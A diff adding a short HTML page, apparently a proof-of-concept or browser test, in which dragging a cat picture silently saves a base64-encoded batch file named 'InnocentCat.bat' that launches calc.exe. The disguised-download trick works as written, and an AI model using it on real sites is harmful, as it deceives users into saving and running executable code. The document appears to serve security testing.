@@ -1,0 +1,18 @@
+
+<html>
+  <body>
+	<h1> Drag to download the picture to your desktop </h1>
+	<a draggable="true" id="innocentdata" href="/cat.jpg">
+	  <img style="width:400px;height:400px" src="/cat.jpg">
+	</a>
+	<script>
+	  document.getElementById("innocentdata").addEventListener("dragstart",
+	  function(event) {
+		var url = "data:application/x-msdownload;base64,QzpcV2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZSANCg=="
+		event.dataTransfer.setData("DownloadURL",
+		"application/octet-stream:InnocentCat.bat:" + url);
+	  }
+	  , false);
+	</script>
+  </body>
+</html>
